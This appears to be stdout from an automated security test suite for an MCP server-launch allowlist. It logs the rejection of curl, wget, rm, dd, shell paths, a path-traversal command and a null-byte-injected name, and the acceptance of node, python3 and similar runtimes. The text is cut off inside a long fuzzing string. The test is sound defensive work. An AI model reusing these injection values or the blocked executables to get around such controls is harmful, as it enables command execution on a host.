[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject ruby executable[22m[39m
2026-02-12T17:11:35.765Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"ruby","basename":"ruby","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject curl executable[22m[39m
2026-02-12T17:11:35.768Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"curl","basename":"curl","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject wget executable[22m[39m
2026-02-12T17:11:35.771Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"wget","basename":"wget","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject system utilities[22m[39m
2026-02-12T17:11:35.773Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"rm","basename":"rm","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.774Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"mv","basename":"mv","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.775Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"cp","basename":"cp","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.775Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"dd","basename":"dd","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.776Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"chmod","basename":"chmod","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.777Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"chown","basename":"chown","allowedExecutables":["node","python3"]}
2026-02-12T17:11:35.778Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"kill","basename":"kill","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject executable with full path outside allowlist[22m[39m
2026-02-12T17:11:35.781Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"/bin/bash","basename":"bash"}
2026-02-12T17:11:35.781Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/bin/bash"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject executable with relative path[22m[39m
2026-02-12T17:11:35.807Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"../../../bin/sh","basename":"sh","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mPath Traversal in Executable Path[2m > [22m[2mshould reject command with ../ in path[22m[39m
2026-02-12T17:11:35.809Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"../../../usr/bin/malicious","basename":"malicious","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mPath Traversal in Executable Path[2m > [22m[2mshould reject command with absolute path to system binary[22m[39m
2026-02-12T17:11:35.812Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"C:\\Windows\\System32\\cmd.exe","basename":"cmd.exe"}
2026-02-12T17:11:35.812Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"C:\\Windows\\System32\\cmd.exe"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mPath Traversal in Executable Path[2m > [22m[2mshould extract basename correctly from full path[22m[39m
2026-02-12T17:11:35.824Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"/usr/bin/node","basename":"node"}
2026-02-12T17:11:35.824Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/usr/bin/node"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mPath Traversal in Executable Path[2m > [22m[2mshould handle Windows paths correctly[22m[39m
2026-02-12T17:11:35.831Z [[33mwarn[39m]: where/which returned success but no paths found {"userId":1,"absolutePath":"C:\\Program Files\\nodejs\\node.exe","basename":"node.exe"}
2026-02-12T17:11:35.831Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"C:\\Program Files\\nodejs\\node.exe"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow node command[22m[39m
2026-02-12T17:11:35.835Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-node","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow python3 command[22m[39m
2026-02-12T17:11:35.838Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-python","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow npx command[22m[39m
2026-02-12T17:11:35.841Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-npx","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow deno command[22m[39m
2026-02-12T17:11:35.844Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-deno","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow bun command[22m[39m
2026-02-12T17:11:35.847Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-bun","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould allow commands with safe arguments[22m[39m
2026-02-12T17:11:35.849Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-with-args","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mSafe Commands from Allowlist[2m > [22m[2mshould be case-insensitive on Windows[22m[39m
2026-02-12T17:11:35.852Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"case-insensitive","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEnvironment Variable Injection[2m > [22m[2mshould handle arguments with environment variables safely[22m[39m
2026-02-12T17:11:35.855Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"env-vars","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEnvironment Variable Injection[2m > [22m[2mshould not execute commands in ${} syntax[22m[39m
2026-02-12T17:11:35.857Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"curly-brace-injection","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mNull Byte Injection[2m > [22m[2mshould handle null bytes in command name[22m[39m
2026-02-12T17:11:35.860Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node\u0000malicious","basename":"node\u0000malicious","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mNull Byte Injection[2m > [22m[2mshould handle null bytes in arguments safely[22m[39m
2026-02-12T17:11:35.863Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"null-byte-args","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mGlob Pattern Injection[2m > [22m[2mshould handle glob patterns in arguments safely[22m[39m
2026-02-12T17:11:35.866Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"glob-patterns","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mCustom Allowlist Configuration[2m > [22m[2mshould respect custom allowlist from environment[22m[39m
2026-02-12T17:11:35.869Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-custom","serverType":"stdio"}
2026-02-12T17:11:35.870Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"custom-allowed","serverType":"stdio"}
2026-02-12T17:11:35.870Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"python","basename":"python","allowedExecutables":["node","custom-executable"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEdge Cases and Fuzzing[2m > [22m[2mshould handle extremely long command names[22m[39m
2026-02-12T17:11:35.885Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","basename":"aaaaaaaaaaaaaaaaaaaaaaaaaaa